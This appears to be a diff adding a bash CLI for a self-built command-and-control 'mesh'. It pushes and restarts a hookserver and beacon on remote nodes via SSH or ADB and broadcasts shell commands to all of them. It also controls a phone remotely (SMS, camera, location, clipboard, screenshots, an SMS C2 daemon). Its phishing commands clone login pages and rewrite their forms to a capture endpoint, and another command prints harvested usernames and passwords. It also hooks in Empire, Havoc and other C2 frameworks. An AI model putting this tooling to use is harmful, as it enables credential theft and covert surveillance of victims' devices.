+def try_ollama(host, port, model, timeout=30):
+    url = f'http://{host}:{port}/api/generate'
+    data = json.dumps({'model': model, 'prompt': prompt, 'stream': False}).encode()
+    req = urllib.request.Request(url, data=data, headers={'Content-Type': 'application/json'})
+    with urllib.request.urlopen(req, timeout=timeout) as resp:
+        return json.loads(resp.read())
+
+for node_name in priority:
+    node = nodes.get(node_name, {})
+    oll = node.get('ollama')
+    if not oll:
+        continue
+    hosts = [oll['host']]
+    if oll.get('host_ts'):
+        hosts.append(oll['host_ts'])
+    port = oll['port']
+    models = oll.get('models', [])
+    if not models:
+        continue
+    model = models[0]
+    for host in hosts:
+        try:
+            result = try_ollama(host, port, model)
+            print(f'\033[2m[{node_name}:{model}]\033[0m')
+            print(result.get('response', ''))
+            sys.exit(0)
+        except Exception:
+            continue
+
+print('\033[0;31mNo Ollama endpoint reachable\033[0m')
+sys.exit(1)
+" "$prompt"
+}
+
+# ── Subagent Delegation ──────────────────────────
+cmd_delegate() {
+  local node="${1:?Usage: hooks delegate <node> <command...>}"
+  shift
+  local cmd="$*"
+  echo -e "${CYN}Delegating to ${WHT}$node${CYN}: ${DIM}$cmd${RST}"
+  if _node_ssh "$node" "$cmd" 2>&1; then
+    echo -e "${GRN}Done${RST}"
+  else
+    echo -e "${RED}Failed to reach $node${RST}"
+  fi
+}
+
+cmd_exec_all() {
+  local cmd="${*:?Usage: hooks exec <command>}"
+  echo -e "${BLD}Executing on all online nodes:${RST} $cmd"
+  echo ""
+  python3 -c "
+import json
+nodes = json.load(open('$NODES_FILE'))['nodes']
+for name in nodes:
+    print(name)
+" 2>/dev/null | while read -r node; do
+    if [ "$node" = "laptop" ]; then
+      echo -e "  ${GRN}●${RST} ${BLD}laptop${RST}:"
+      eval "$cmd" 2>&1 | sed 's/^/    /'
+    else
+      echo -e "  ${CYN}●${RST} ${BLD}$node${RST}:"
+      _node_ssh "$node" "$cmd" 2>&1 | sed 's/^/    /' || echo -e "    ${RED}unreachable${RST}"
+    fi
+    echo ""
+  done
+}
+
+# ── Sync ─────────────────────────────────────────
+
+cmd_sync() {
+  local target="${1:-all}"
+  local FILES="$C2_HOME/hookserver.py $C2_HOME/beacon.py $C2_HOME/nodes.json $C2_HOME/config.json"
+  local HOOK_FILES="$C2_HOME/hooks.d/"*
+
+  _sync_node() {
+    local node="$1"
+    local ssh_host=$(python3 -c "import json; print(json.load(open('$NODES_FILE'))['nodes']['$node']['ssh'])" 2>/dev/null)
+    local port=$(python3 -c "import json; print(json.load(open('$NODES_FILE'))['nodes']['$node'].get('port',22))" 2>/dev/null)
+    local user=$(python3 -c "import json; print(json.load(open('$NODES_FILE'))['nodes']['$node']['user'])" 2>/dev/null)
+
+    echo -e "  ${CYN}→ $node${RST} ($ssh_host)"
+
+    # Try SSH sync
+    if _node_ssh "$node" "echo ok" >/dev/null 2>&1; then
+      # Ensure dirs exist
+      _node_ssh "$node" "mkdir -p ~/c2/hooks.d ~/c2/logs ~/bin"
+
+      local scp_port=""
+      [ "$port" != "22" ] && scp_port="-P $port"
+
+      scp $scp_port $FILES "$ssh_host:~/c2/" 2>/dev/null
+      scp $scp_port $HOOK_FILES "$ssh_host:~/c2/hooks.d/" 2>/dev/null
+      scp $scp_port "$HOME/bin/hooks" "$ssh_host:~/bin/hooks" 2>/dev/null
+      _node_ssh "$node" "chmod +x ~/bin/hooks ~/c2/hooks.d/*.sh 2>/dev/null"
+
+      # Restart hookserver on remote
+      _node_ssh "$node" "pkill -f hookserver.py 2>/dev/null; sleep 1; cd ~/c2 && nohup python3 hookserver.py >> logs/server.log 2>&1 &" 2>/dev/null
+      echo -e "    ${GRN}Synced + restarted${RST}"
+    else
+      # Phone fallback: try ADB
+      if [ "$node" = "phone" ] && adb devices 2>/dev/null | grep -q "device$"; then
+        echo -e "    ${YLW}SSH failed, using ADB...${RST}"
+        adb push "$C2_HOME/hookserver.py" /sdcard/c2/hookserver.py 2>/dev/null
+        adb push "$C2_HOME/nodes.json" /sdcard/c2/nodes.json 2>/dev/null
+        adb push "$HOME/bin/hooks" /sdcard/c2/hooks 2>/dev/null
+        for f in $HOOK_FILES; do
+          adb push "$f" "/sdcard/c2/hooks.d/$(basename "$f")" 2>/dev/null
+        done
+        echo -e "    ${GRN}Pushed via ADB.${RST} In Termux: cp -r /sdcard/c2/* ~/c2/ && cp /sdcard/c2/hooks ~/bin/"
+      else
+        echo -e "    ${RED}Unreachable${RST}"
+      fi
+    fi
+  }
+
+  echo -e "${BLD}Syncing C2 mesh...${RST}"
+  if [ "$target" = "all" ]; then
+    python3 -c "
+import json
+nodes = json.load(open('$NODES_FILE'))['nodes']
+for name in nodes:
+    if name != 'laptop':
+        print(name)
+" 2>/dev/null | while read -r node; do
+      _sync_node "$node"
+    done
+  else
+    _sync_node "$target"
+  fi
+  echo -e "${GRN}Sync complete${RST}"
+}
+
+cmd_pull() {
+  local node="${1:-phone}"
+  echo -e "${CYN}Pulling events from ${WHT}$node${RST}..."
+
+  if ! _node_ssh "$node" "echo ok" >/dev/null 2>&1; then
+    echo -e "${RED}$node unreachable${RST}"
+    return
+  fi
+
+  _node_ssh "$node" "sqlite3 ~/c2/events.db 'SELECT * FROM events ORDER BY id DESC LIMIT 20'" 2>/dev/null | while IFS='|' read -r id ts src etype data ip handled; do
+    echo -e "  ${DIM}$ts${RST} ${WHT}$etype${RST} from $ip"
+  done
+}
+
+
+# ── Phone Workflows (remote) ────────────────────
+cmd_wf() {
+  local subcmd="${1:-help}"
+  shift 2>/dev/null
+  echo -e "${CYN}Running phone workflow: ${WHT}$subcmd${RST}"
+  _node_ssh "phone" "export RISH_APPLICATION_ID=com.termux; ~/c2/phone_workflows.sh $subcmd $*" 2>&1
+}
+
+# ── SMS Commands ────────────────────────────────
+cmd_sms() {
+  local subcmd="${1:-list}"
+  shift 2>/dev/null
+  case "$subcmd" in
+    send)
+      local num="${1:?Usage: hooks sms send <number> <message>}"
+      shift
+      local msg="$*"
+      echo -e "${CYN}Sending SMS via phone...${RST}"
+      _node_ssh "phone" "export RISH_APPLICATION_ID=com.termux; ~/c2/phone_workflows.sh sms-send '$num' '$msg'" 2>&1
+      ;;
+    list|inbox)
+      echo -e "${CYN}Fetching SMS inbox...${RST}"
+      _node_ssh "phone" "export RISH_APPLICATION_ID=com.termux; ~/c2/phone_workflows.sh sms-monitor ${1:-20}" 2>&1
+      ;;
+    c2)
+      echo -e "${CYN}Starting SMS C2 on phone...${RST}"
+      _node_ssh "phone" "nohup ~/c2/phone_workflows.sh sms-c2 >> ~/c2/logs/sms_c2.log 2>&1 &" 2>&1
+      echo -e "${GRN}SMS C2 daemon started on phone${RST}"
+      ;;
+    *)
+      echo -e "  ${WHT}hooks sms send${RST} <num> <msg>  Send SMS"
+      echo -e "  ${WHT}hooks sms list${RST} [count]      List inbox"
+      echo -e "  ${WHT}hooks sms c2${RST}                Start SMS C2 daemon"
+      ;;
+  esac
+}
+
+# ── Quick Device Intel ──────────────────────────
+cmd_cam() {
+  local cam="${1:-0}"
+  echo -e "${CYN}Taking photo (camera $cam)...${RST}"
+  _node_ssh "phone" "export RISH_APPLICATION_ID=com.termux; ~/c2/phone_workflows.sh camera $cam" 2>&1
+}
+
+cmd_loc() {
+  echo -e "${CYN}Getting location...${RST}"
+  _node_ssh "phone" "export RISH_APPLICATION_ID=com.termux; ~/c2/phone_workflows.sh location" 2>&1
+}
+
+cmd_clip() {
+  echo -e "${CYN}Reading clipboard...${RST}"
+  _node_ssh "phone" "export RISH_APPLICATION_ID=com.termux; ~/c2/phone_workflows.sh clipboard" 2>&1
+}
+
+cmd_ss() {
+  echo -e "${CYN}Taking screenshot...${RST}"
+  _node_ssh "phone" "export RISH_APPLICATION_ID=com.termux; ~/c2/phone_workflows.sh screenshot" 2>&1
+}
+
+# ── Phishing Commands ───────────────────────────
+cmd_phish() {
+  local subcmd="${1:-help}"
+  shift 2>/dev/null
+  case "$subcmd" in
+    create)
+      local name="${1:?Usage: hooks phish create <name> [template]}"
+      local template="${2:-generic}"
+      echo -e "${CYN}Creating campaign: $name${RST}"
+      TSIP=$(ip -4 -o addr show tailscale0 2>/dev/null | awk '{print $4}' | cut -d/ -f1)
+      [ -z "$TSIP" ] && TSIP="127.0.0.1"
+      HPORT=$(python3 -c "import json; print(json.load(open('$C2_HOME/config.json')).get('hook_port',9800))" 2>/dev/null || echo "9800")
+      curl -s -X POST "http://127.0.0.1:9800/phish/campaign" \
+        -H "Content-Type: application/json" \
+        -d "{\"name\":\"$name\",\"template\":\"$template\",\"callback_url\":\"http://$TSIP:$HPORT/phish/landing/$name\"}" | python3 -m json.tool 2>/dev/null
+      echo ""
+      echo -e "  Landing: ${WHT}http://$TSIP:$HPORT/phish/landing/$name${RST}"
+      echo -e "  QR:      ${WHT}http://$TSIP:$HPORT/phish/qr/$name${RST}"
+      ;;
+    list|ls)
+      echo -e "${BLD}Phishing Campaigns${RST}"
+      curl -s "http://127.0.0.1:9800/phish/campaigns" | python3 -c "
+import sys, json
+campaigns = json.load(sys.stdin)
+for c in campaigns:
+    status_c = '\033[0;32m' if c['status'] == 'active' else '\033[2m'
+    print(f\"  {status_c}{c['status']:8}\033[0m \033[1m{c['name']:20}\033[0m  tpl={c['template']:10} hits={c['hits']} \033[0;31mcaptures={c['captures']}\033[0m\")
+" 2>/dev/null || echo "Server not running?"
+      ;;
+    captures)
+      echo -e "${BLD}Phishing Captures${RST}"
+      curl -s "http://127.0.0.1:9800/phish/captures" | python3 -m json.tool 2>/dev/null
+      ;;
+    qr)
+      local name="${1:?Usage: hooks phish qr <name>}"
+      HPORT=$(python3 -c "import json; print(json.load(open('$C2_HOME/config.json')).get('hook_port',9800))" 2>/dev/null || echo "9800")
+      echo -e "${CYN}QR Code: http://127.0.0.1:$HPORT/phish/qr/$name${RST}"
+      if command -v xdg-open &>/dev/null; then
+        xdg-open "http://127.0.0.1:$HPORT/phish/qr/$name" 2>/dev/null &
+      fi
+      ;;
+    serve)
+      local port="${1:-8888}"
+      echo -e "${CYN}Starting phish server on phone :$port${RST}"
+      _node_ssh "phone" "nohup ~/c2/phone_workflows.sh phish-serve $port >> ~/c2/logs/phish_serve.log 2>&1 &" 2>&1
+      echo -e "${GRN}Phone phish server started on :$port${RST}"
+      ;;
+    clone)
+      local url="${1:?Usage: hooks phish clone <url>}"
+      local name="${2:-$(echo "$url" | sed 's|https\?://||;s|/.*||;s|\.|-|g')}"
+      local template_dir="$C2_HOME/phish_templates"
+      mkdir -p "$template_dir"
+      echo -e "${CYN}Cloning $url -> $template_dir/$name.html${RST}"
+      curl -sL "$url" -o "$template_dir/$name.html" 2>/dev/null
+      # Inject capture form action
+      sed -i "s|action=\"[^\"]*\"|action=\"/phish/capture\"|g" "$template_dir/$name.html" 2>/dev/null
+      local size=$(du -h "$template_dir/$name.html" 2>/dev/null | cut -f1)
+      echo -e "${GRN}Cloned ($size). Edit: $template_dir/$name.html${RST}"
+      echo -e "${DIM}Note: form actions rewritten to /phish/capture${RST}"
+      ;;
+    *)
+      echo -e "  ${WHT}hooks phish create${RST} <name> [tpl]  Create campaign"
+      echo -e "  ${WHT}hooks phish list${RST}                 List campaigns"
+      echo -e "  ${WHT}hooks phish captures${RST}             Show captures"
+      echo -e "  ${WHT}hooks phish qr${RST} <name>            Open QR code"
+      echo -e "  ${WHT}hooks phish serve${RST} [port]          Start phone phish server"
+      echo -e "  ${WHT}hooks phish clone${RST} <url>           Clone a page"
+      ;;
+  esac
+}
+
+# ── Credential Commands ─────────────────────────
+cmd_creds() {
+  echo -e "${BLD}Stored Credentials${RST}"
+  curl -s "http://127.0.0.1:9800/creds" | python3 -c "
+import sys, json
+creds = json.load(sys.stdin)
+for c in creds:
+    print(f\"  \033[2m{c['timestamp'][:19]}\033[0m  src=\033[0;33m{c['source']:15}\033[0m  \033[1m{c['username']:20}\033[0m  pw=\033[0;31m{c['password']}\033[0m  {c.get('url','')[:40]}\")
+if not creds:
+    print('  No credentials stored')
+" 2>/dev/null || echo "Server not running?"
+}
+
+# ── Message Commands ────────────────────────────
+cmd_msg() {
+  local subcmd="${1:-list}"
+  shift 2>/dev/null
+  case "$subcmd" in
+    send)
+      local to="${1:?Usage: hooks msg send <node> <payload>}"
+      shift
+      local payload="$*"
+      curl -s -X POST "http://127.0.0.1:9800/msg/send" \
+        -H "Content-Type: application/json" \
+        -d "{\"to\":\"$to\",\"from\":\"laptop\",\"type\":\"command\",\"payload\":\"$payload\"}" | python3 -m json.tool 2>/dev/null
+      ;;
+    pending)
+      local node="${1:?Usage: hooks msg pending <node>}"
+      curl -s "http://127.0.0.1:9800/msg/pending/$node" | python3 -m json.tool 2>/dev/null
+      ;;
+    list)
+      curl -s "http://127.0.0.1:9800/messages" | python3 -c "
+import sys, json
+msgs = json.load(sys.stdin)
+for m in msgs:
+    d = '\033[0;32m✓\033[0m' if m['delivered'] else '\033[0;31m●\033[0m'
+    print(f\"  {d} \033[2m{m['timestamp'][:19]}\033[0m {m['from_node']:8} → {m['to_node']:8}  [{m['msg_type']}] {str(m['payload'])[:50]}\")
+if not msgs: print('  No messages')
+" 2>/dev/null || echo "Server not running?"
+      ;;
+    *)
+      echo -e "  ${WHT}hooks msg send${RST} <node> <payload>  Queue message"
+      echo -e "  ${WHT}hooks msg pending${RST} <node>          Fetch pending"
+      echo -e "  ${WHT}hooks msg list${RST}                    List all messages"
+      ;;
+  esac
+}
+
+# ── Auto-Update ─────────────────────────────────
+cmd_update() {
+  echo -e "${BLD}${CYN}C2 Auto-Update${RST}"
+
+  local version
+  version=$(python3 -c "import json; print(json.load(open('$C2_HOME/config.json')).get('version','0.0.0'))" 2>/dev/null || echo "0.0.0")
+  echo -e "  Current version: ${WHT}$version${RST}"
+
+  # Check if c2 is a git repo
+  if [ -d "$C2_HOME/.git" ]; then
+    echo -e "${CYN}Pulling latest from git...${RST}"
+    cd "$C2_HOME" && git pull 2>&1 | sed 's/^/  /'
+  else
+    echo -e "${DIM}Not a git repo — manual update mode${RST}"
+  fi
+
+  # Bump version
+  local new_ver
+  new_ver=$(python3 -c "
+v = '$version'.split('.')
+v[-1] = str(int(v[-1]) + 1)
+print('.'.join(v))
+" 2>/dev/null)
+  python3 -c "
+import json
+with open('$C2_HOME/config.json') as f: cfg = json.load(f)
+cfg['version'] = '$new_ver'
+with open('$C2_HOME/config.json', 'w') as f: json.dump(cfg, f, indent=2)
+" 2>/dev/null
+
+  echo -e "  New version: ${GRN}$new_ver${RST}"
+
+  # Restart hookserver
+  echo -e "${CYN}Restarting hookserver...${RST}"
+  cmd_restart
+
+  # Sync to nodes
+  echo -e "${CYN}Syncing to mesh...${RST}"
+  cmd_sync "all" 2>/dev/null
+
+  echo -e "${GRN}Update complete${RST}"
+}
+
+# ── Dispatch ─────────────────────────────────────
+case "${1}" in
+  start)       cmd_start ;;
+  stop)        cmd_stop ;;
+  restart)     cmd_restart ;;
+  status|st)   cmd_status ;;
+  events|ev)   shift; cmd_events "$@" ;;
+  callbacks|cb) shift; cmd_callbacks "$@" ;;
+  fire|f)      shift; cmd_fire "$@" ;;
+  token|tok)   cmd_token ;;
+  url|urls)    cmd_url ;;
+  empire|emp)  cmd_empire ;;
+  havoc|hav)   shift; cmd_havoc "$@" ;;
+  villain|vil) cmd_villain ;;
+  starkiller|sk) cmd_starkiller ;;
+  list|ls)     cmd_list ;;
+  add)         shift; cmd_add "$@" ;;
+  edit)        shift; cmd_edit "$@" ;;
+  disable)     shift; cmd_disable "$@" ;;
+  enable)      shift; cmd_enable "$@" ;;
+  log)         cmd_log ;;
+  dashboard|dash) cmd_dashboard ;;
+  bb)          shift; cmd_bb "$@" ;;
+  nodes|mesh)  cmd_nodes ;;
+  ollama|ai)   shift; cmd_ollama "$@" ;;
+  delegate|del) shift; cmd_delegate "$@" ;;
+  exec)        shift; cmd_exec_all "$@" ;;
+  sync)        shift; cmd_sync "$@" ;;
+  pull)        shift; cmd_pull "$@" ;;
+  wf)          shift; cmd_wf "$@" ;;
+  # Device intel shortcuts
+  sms)         shift; cmd_sms "$@" ;;
+  cam|camera)  shift; cmd_cam "$@" ;;
+  loc|location) cmd_loc ;;
+  clip|clipboard) cmd_clip ;;
+  ss|screenshot) cmd_ss ;;
+  # Phishing
+  phish)       shift; cmd_phish "$@" ;;
+  creds)       cmd_creds ;;
+  # Messaging
+  msg|message) shift; cmd_msg "$@" ;;
+  # Maintenance
+  update)      cmd_update ;;
+  # Beacon
+  beacon)      echo -e "${CYN}Starting beacon listener...${RST}"; nohup python3 "$C2_HOME/beacon.py" serve >> "$C2_HOME/logs/beacon.log" 2>&1 & echo -e "${GRN}Beacon listener started (PID $!)${RST} — HTTP :9802 + DNS :5353" ;;
+  heartbeat|hb) echo -e "${CYN}Starting heartbeat...${RST}"; nohup python3 "$C2_HOME/beacon.py" beat >> "$C2_HOME/logs/beacon.log" 2>&1 & echo -e "${GRN}Heartbeating (PID $!)${RST}" ;;
+  dormant)     _dsecs="${2:-300}"; echo -e "${YLW}Going dormant (beacon every ${_dsecs}s)...${RST}"; nohup python3 "$C2_HOME/beacon.py" dormant "$_dsecs" >> "$C2_HOME/logs/beacon.log" 2>&1 & echo -e "${GRN}Dormant mode (PID $!)${RST}" ;;
+  ping)        python3 "$C2_HOME/beacon.py" status ;;
+  *)           usage ;;
+esac
